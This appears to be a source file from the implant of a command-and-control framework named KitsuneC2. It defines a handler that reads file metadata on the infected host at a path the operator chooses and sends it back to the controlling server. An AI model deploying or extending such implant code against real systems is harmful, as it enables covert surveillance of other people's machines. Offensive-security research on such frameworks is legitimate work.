package main

import (
	"KitsuneC2/implant/modules"
	"KitsuneC2/lib/communication"
	"net"
)

var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
	//reserved for implant functionality
	11: handleFileInfoReq,
}

func handleFileInfoReq(conn net.Conn, arguments interface{}) {
	fileInfoReq, ok := arguments.(*communication.FileInfoReq)
	if !ok {
		return
	}
	results, _ := modules.FileInfo(fileInfoReq.PathToFile)

	resp := communication.FileInfoResp{Name: results.Name(), Size: results.Size(), Mode: results.Mode().String(), ModTime: int(results.ModTime().Unix()), IsDir: results.IsDir()}
	SendEnvelopeToServer(conn, 12, resp)
}
